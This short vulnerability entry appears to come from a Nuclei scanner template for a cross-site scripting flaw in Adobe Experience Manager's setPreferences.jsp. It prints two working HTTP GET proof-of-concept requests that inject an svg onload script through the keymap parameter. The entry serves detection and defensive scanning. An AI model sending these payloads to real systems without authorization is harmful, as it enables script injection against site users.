# Vulnerability: Adobe Experience Manager - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`aem-setpreferences-xss.yaml`)

## Description
Adobe Experience Manager contains a cross-site scripting vulnerability via setPreferences.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
GET {{BaseURL}}/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
```

